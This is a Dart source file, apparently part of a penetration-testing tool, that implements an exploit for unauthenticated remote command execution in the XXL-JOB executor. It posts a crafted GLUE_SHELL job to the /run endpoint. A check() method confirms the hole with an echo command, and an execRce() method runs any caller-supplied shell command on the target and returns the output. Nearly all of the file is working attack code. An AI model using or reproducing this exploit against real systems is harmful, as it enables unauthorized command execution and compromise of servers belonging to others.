import 'dart:convert';

import 'package:http/http.dart' as http;

import 'exp_result.dart';

class XxlJobExpService {
  final String baseUrl;
  final Duration timeout;

  XxlJobExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final payload = jsonEncode({
        'jobId': 1,
        'executorHandler': 'demoJobHandler',
        'executorParams': 'demoJobHandler',
        'executorBlockStrategy': 'COVER_EARLY',
        'executorTimeout': 0,
        'logId': 1,
        'logDateTime': 1586629003729,
        'glueType': 'GLUE_SHELL',
        'glueSource': 'echo xxljob_54289',
        'glueUpdatetime': 1586699003758,
        'broadcastIndex': 0,
        'broadcastTotal': 0,
      });
      final res = await http
          .post(
            Uri.parse('$_base/run'),
            headers: {'Content-Type': 'application/json'},
            body: payload,
          )
          .timeout(timeout);
      if (res.statusCode == 200 && res.body.contains('200')) {
        return ExpResult(true, 'XXL-JOB 未授权 RCE', '执行器接口未授权，命令提交成功');
      }
    } catch (_) {}
    return const ExpResult(false, 'XXL-JOB 未授权 RCE', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final payload = jsonEncode({
        'jobId': 1,
        'executorHandler': 'demoJobHandler',
        'executorParams': 'demoJobHandler',
        'executorBlockStrategy': 'COVER_EARLY',
        'executorTimeout': 0,
        'logId': 1,
        'logDateTime': DateTime.now().millisecondsSinceEpoch,
        'glueType': 'GLUE_SHELL',
        'glueSource': cmd,
        'glueUpdatetime': DateTime.now().millisecondsSinceEpoch,
        'broadcastIndex': 0,
        'broadcastTotal': 0,
      });
      final res = await http
          .post(
            Uri.parse('$_base/run'),
            headers: {'Content-Type': 'application/json'},
            body: payload,
          )
          .timeout(timeout);
      return res.body;
    } catch (_) {
      return null;
    }
  }
}
